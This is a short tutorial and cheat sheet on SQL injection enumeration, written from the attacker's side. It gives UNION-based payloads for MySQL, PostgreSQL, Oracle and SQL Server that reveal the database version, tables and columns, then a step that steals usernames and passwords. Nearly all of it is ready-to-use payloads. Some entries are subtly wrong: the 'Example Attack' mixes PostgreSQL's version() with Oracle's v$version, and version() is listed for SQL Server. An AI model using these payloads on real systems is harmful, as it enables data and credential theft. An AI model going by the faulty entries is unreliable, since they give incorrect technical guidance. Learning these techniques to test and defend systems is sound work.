## Examining the Database – Simple Explanation

Before you can steal data, you need to know what's in the database. Here's how hackers do it.

---

## 1. Find the Database Type and Version

Different databases have different functions to reveal their version.

### Version Queries by Database:

| Database | Payload | What it returns |
|----------|---------|-----------------|
| **MySQL** | `' UNION SELECT @@version --` | `8.0.31` |
| **PostgreSQL** | `' UNION SELECT version() --` | `PostgreSQL 14.5` |
| **Oracle** | `' UNION SELECT banner FROM v$version --` | `Oracle Database 19c` |
| **SQL Server** | `' UNION SELECT @@version --` | `Microsoft SQL Server 2019` |

### Example Attack:

```sql
' UNION SELECT NULL, version() FROM v$version --
```

---

## 2. Find All Tables in the Database

Query the database's system tables.

### By Database:

| Database | Payload |
|----------|---------|
| **MySQL, PostgreSQL, SQLite** | `' UNION SELECT table_name FROM information_schema.tables --` |
| **Oracle** | `' UNION SELECT table_name FROM all_tables --` |
| **SQL Server** | `' UNION SELECT table_name FROM information_schema.tables --` |

### Example Output:

```
users
products
orders
admins
credit_cards
```

---

## 3. Find All Columns in a Specific Table

Once you find a table like `users`, find its columns.

### Payload:
```sql
' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --
```

### Example Output:

```
user_id
username
password
email
created_at
```

---

## Complete Hacker Workflow

```
Step 1: Find database version
    ↓
' UNION SELECT version() -- 
    ↓
PostgreSQL 14.5 (now I know to use || for concatenation)
    ↓
Step 2: Find table names
    ↓
' UNION SELECT table_name FROM information_schema.tables --
    ↓
users, products, admins
    ↓
Step 3: Find columns in 'users'
    ↓
' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --
    ↓
username, password, email
    ↓
Step 4: Steal the data
    ↓
' UNION SELECT username, password FROM users --
```

---

## Quick Reference Cheat Sheet

| What to find | MySQL / PostgreSQL / SQL Server | Oracle |
|--------------|--------------------------------|--------|
| Database version | `SELECT version()` or `SELECT @@version` | `SELECT banner FROM v$version` |
| All tables | `SELECT table_name FROM information_schema.tables` | `SELECT table_name FROM all_tables` |
| Columns in a table | `SELECT column_name FROM information_schema.columns WHERE table_name='users'` | `SELECT column_name FROM all_tab_columns WHERE table_name='USERS'` |
| Current database name | `SELECT database()` | `SELECT global_name FROM global_name` |
| Current user | `SELECT user()` | `SELECT user FROM dual` |

---

## One Sentence Summary

Hackers query system tables like `information_schema.tables` and `information_schema.columns` to map out the entire database before stealing data.